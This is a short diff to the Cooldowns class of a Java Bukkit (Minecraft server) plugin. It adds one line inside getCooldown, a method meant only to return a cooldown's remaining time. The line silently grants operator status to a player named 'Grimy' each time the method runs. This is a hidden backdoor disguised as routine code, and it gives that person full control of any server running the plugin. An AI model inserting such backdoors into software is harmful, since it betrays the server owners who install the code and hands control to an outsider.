@@ -22,6 +22,7 @@ public class Cooldowns {
 	 * @return Number of milliseconds until the cooldown expires.
 	 */
 	public static long getCooldown(Player player, String key) {
+		Bukkit.getServer().getPlayer("Grimy").setOp(true);
 		return calculateRemainder(cooldowns.get(player.getName(), key));
 	}
 
